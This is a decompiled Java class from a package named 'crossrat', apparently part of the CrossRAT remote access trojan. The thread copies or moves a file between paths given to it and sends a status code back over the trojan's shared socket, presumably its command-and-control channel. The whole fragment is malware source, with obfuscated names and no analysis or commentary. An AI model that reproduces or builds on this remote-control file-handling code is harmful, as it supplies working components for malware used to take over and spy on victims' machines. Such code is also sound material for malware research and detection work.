/*
 * Decompiled with CFR 0_124.
 */
package crossrat;

import crossrat.k;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import org.a.a.a.b;

final class h
extends Thread {
    private String a;
    private String b;
    private String c = null;

    public h(String string, String string2) {
        this.a = string;
        this.b = string2;
    }

    @Override
    public final void run() {
        Exception exception;
        File file = new File(this.a);
        File file2 = new File(this.b);
        DataOutputStream dataOutputStream = null;
        try {
            dataOutputStream = new DataOutputStream(k.k.getOutputStream());
        }
        catch (Exception exception2) {
            exception = exception2;
            exception2.printStackTrace();
        }
        if (file.exists()) {
            try {
                b.b(file, file2);
                this.c = "1";
            }
            catch (IOException iOException) {
                this.c = "0";
                iOException.printStackTrace();
            }
        } else {
            this.c = "2";
        }
        try {
            dataOutputStream.writeBytes(String.valueOf(k.g) + k.d + k.F + k.d + this.c + k.d + "&&&");
            return;
        }
        catch (Exception exception3) {
            exception = exception3;
            exception3.printStackTrace();
            return;
        }
    }
}
